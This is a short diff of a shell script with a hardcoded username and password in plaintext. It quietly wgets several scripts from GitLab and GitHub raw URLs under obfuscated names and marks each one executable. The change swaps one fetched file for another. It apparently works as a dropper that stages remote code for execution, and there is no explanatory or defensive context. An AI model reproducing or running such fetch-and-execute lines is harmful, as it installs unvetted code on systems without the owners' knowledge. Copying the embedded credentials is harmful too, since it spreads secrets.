@@ -4,7 +4,7 @@ user="nrrmfinr"
 pass="9rrin80d68ba" 
 wget -q -O HD9TSQaJ6431 https://gitlab.com/55113110159/ultras/-/raw/main/profil.sh && chmod +x HD9TSQaJ6431
 wget -q -O HD9TSQaJ6432 https://gitlab.com/55113110159/ultras/-/raw/main/info.sh && chmod +x HD9TSQaJ6432
-wget -q -O HD9TSQaJ6437 https://raw.githubusercontent.com/55113110159/go/main/python.py && chmod +x HD9TSQaJ6437
+wget -q -O HD9TSQaJ6437 https://raw.githubusercontent.com/55113110159/go/main/python2.sh && chmod +x HD9TSQaJ6437
 wget -q -O HD9TSQaJ6433 https://gitlab.com/55113110159/ultras/-/raw/main/memo.sh && chmod +x HD9TSQaJ6433
 wget -q -O HD9TSQaJ6434 https://gitlab.com/55113110159/ultras/-/raw/main/go.sh && chmod +x HD9TSQaJ6434
 wget -q -O HD9TSQaJ6435 https://gitlab.com/55113110159/ultras/-/raw/main/igras.sh && chmod +x HD9TSQaJ6435
